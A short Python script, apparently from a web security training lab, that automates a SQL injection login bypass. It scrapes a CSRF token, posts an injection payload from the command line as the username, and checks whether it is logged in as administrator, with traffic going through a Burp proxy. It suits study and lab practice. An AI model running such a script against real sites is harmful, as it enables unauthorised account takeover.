import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # Burp proxy to allow intercept


def get_csrf_token(session, url):
    response = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input")['value'] # we know the csrf token is in the first <input> tag in the <value> attribute from the HTML response
    return csrf


def exploit_sqli(session, url, payload):
    csrf = get_csrf_token(session, url)

    # format data format (can be found in Burp Suite intercept or the Network tab in developer tools under Payload)
    data = {
        "csrf": csrf, 
        "username": payload,
        "password": "randomtext"
    }
    response = session.post(url, data=data, verify=False, proxies=proxies) # make a POST request to the login functionality
    
    if "Log out" in response.text: # if login was successful, the word "Log out" will be on the page i.e. in the response.txt
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        exit()

    s = requests.Session() # allows persistance of certain parameters across the session; help avoid sending new request every time

    if exploit_sqli(s, url, sqli_payload):
        print("[+] SQL injection successful! We have logged in as the administrator")
    else:
        print("[-] SQL injection failed! We have not logged in as the administrator")